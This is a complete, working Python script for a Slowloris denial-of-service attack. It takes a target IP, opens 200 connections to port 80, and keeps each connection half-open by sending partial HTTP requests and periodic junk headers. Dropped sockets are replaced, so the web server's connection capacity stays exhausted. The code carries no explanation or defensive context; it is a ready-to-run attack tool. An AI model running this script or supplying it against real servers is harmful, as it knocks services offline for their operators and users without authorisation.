import sys
import socket
import time
import random
ip=sys.argv[1]

def create_socket(dest_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    sock.connect((dest_ip, 80))
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    sock.send("User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0\r\n".encode("utf-8"))
    sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return sock

def main():
    sockets=[]
    running=True
    for i in range(1, 201):
        try:
            print("[{0}/200] Creating Socket".format(i))
            newsock=create_socket(ip)
            sockets.append(newsock)
        except socket.error:
            break
    while running:
        try:
            print("\nSending headers to keep connection alive...")
            for sock in sockets:
                try:
                    sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    sockets.remove(sock)
            broken_sockets=200-len(sockets)
            for _ in range(broken_sockets):
                try:
                    newsock=create_socket(ip)
                    sockets.append(newsock)
                except socket.error:
                    break
            time.sleep(15)
        except (KeyboardInterrupt, SystemExit):
            print("Stopping Slowloris DOS attack.")
            running=False

main()



